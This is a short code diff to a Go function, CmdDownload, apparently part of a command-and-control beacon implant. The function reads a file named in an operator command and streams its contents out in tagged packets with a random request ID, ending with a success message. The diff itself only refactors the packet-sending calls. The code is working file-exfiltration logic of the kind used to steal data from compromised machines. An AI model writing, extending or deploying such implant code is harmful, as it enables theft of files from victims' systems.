@@ -62,8 +62,7 @@ func CmdDownload(cmdBuf []byte) ([]byte, error) {
 	requestID := crypt.RandomInt(10000, 99999)
 	requestIDBytes := packet.WriteInt(requestID)
 	result := util.BytesCombine(requestIDBytes, fileLenBytes, filePath)
-	finalPaket := packet.MakePacket(2, result)
-	packet.PushResult(finalPaket)
+	packet.DataProcess(2, result)
 
 	fileHandle, err := os.Open(strFilePath)
 	if err != nil {
@@ -81,11 +80,9 @@ func CmdDownload(cmdBuf []byte) ([]byte, error) {
 		}
 		fileContent = fileBuf[:n]
 		result = util.BytesCombine(requestIDBytes, fileContent)
-		finalPaket = packet.MakePacket(8, result)
-		packet.PushResult(finalPaket)
+		packet.DataProcess(8, result)
 	}
-	finalPaket = packet.MakePacket(9, requestIDBytes)
-	packet.PushResult(finalPaket)
+	packet.DataProcess(9, requestIDBytes)
 	return []byte("Download " + strFilePath + " success"), nil
 
 }
